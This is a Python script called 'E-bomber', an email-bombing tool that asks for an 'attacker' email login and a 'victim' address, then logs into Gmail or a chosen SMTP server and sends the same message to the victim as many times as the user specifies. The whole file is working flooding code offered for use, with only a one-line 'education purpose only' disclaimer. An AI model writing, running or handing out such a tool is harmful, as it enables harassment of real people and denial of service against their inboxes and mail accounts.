#!/usr/bin/python3
#E-bomber
#This code for education purpose only.
#Use it at your own risk !!!
# Python 3 rewrite by Omicron166

from os import urandom
import smtplib
from getpass import getpass
from simple_chalk import chalk, green
import sys
from time import sleep


print('                                                                    ')
print('                                                                    ')
print("$$$$$$$$\                      $$\$$\       $$$$$$$\                       $$\                         ")
print("$$  _____|                     \__$$ |      $$  __$$\                      $$ |                        ")
print("$$ |     $$$$$$\$$$$\  $$$$$$\ $$\$$ |      $$ |  $$ |$$$$$$\ $$$$$$\$$$$\ $$$$$$$\  $$$$$$\  $$$$$$\  ")
print("$$$$$\   $$  _$$  _$$\ \____$$\$$ $$ |      $$$$$$$\ $$  __$$\$$  _$$  _$$\$$  __$$\$$  __$$\$$  __$$\ ")
print("$$  __|  $$ / $$ / $$ |$$$$$$$ $$ $$ |      $$  __$$\$$ /  $$ $$ / $$ / $$ $$ |  $$ $$$$$$$$ $$ |  \__|")
print("$$ |     $$ | $$ | $$ $$  __$$ $$ $$ |      $$ |  $$ $$ |  $$ $$ | $$ | $$ $$ |  $$ $$   ____$$ |      ")
print("$$$$$$$$\$$ | $$ | $$ \$$$$$$$ $$ $$ |      $$$$$$$  \$$$$$$  $$ | $$ | $$ $$$$$$$  \$$$$$$$\$$ |      ")
print("\________\__| \__| \__|\_______\__\__|      \_______/ \______/\__| \__| \__\_______/ \_______\__|      ")
print('\n\n')
print("")

user = input(chalk.green('[1] ----> Anonymous name: '))
email = input(chalk.green('\n[2] ----> Attacker Email Address: '))
passwd = getpass(chalk.green.bold('\n[3] ----> Attacker Email Password: '))
to = input(chalk.red('\n[4] ----> Victim Email Address: '))
total = input(chalk.blue('\n[5] ----> Number of emails: '))
body = input(chalk.blue('\n[6] ----> Message: '))
Cserver = input(chalk.red('\n[+] Custom smtp server (leave blank to use gmail): '))

if not Cserver == '':
    defaultconf = False
    smtp_server = Cserver
    Cport = input('Custom smtp port (leave blank to use defaul port): ')
    if not Cport == '':
        port = int(Cport)
    else:
        port = 587
else:
    smtp_server = 'smtp.gmail.com'
    port = 587
    defaultconf = True


try:
    server = smtplib.SMTP(smtp_server, port)
    server.ehlo()
    server.starttls()
    server.login(email, passwd)
    for i in range(1, int(total) + 1):
        subject = urandom(9)
        msg = 'From: ' + user + '\nMessage: ' + '\n' + body
        server.sendmail(email, to, msg)
        print(chalk.green.bold("\r[+] E-mails sent: %i" % i))
        sleep(1)
        sys.stdout.flush()
    server.quit()
    print('\n Done !!!')
    sys.exit()
except KeyboardInterrupt:
    print(chalk.red('[-] Canceled'))
    sys.exit()
except smtplib.SMTPAuthenticationError:
    print(chalk.red.bold('[!] The username or password you entered is incorrect'))
    sys.exit()
except smtplib.SMTPConnectError:
    print(chalk.red.bold('\n[!] Failed to connect with the SMTP server'))
    sys.exit()
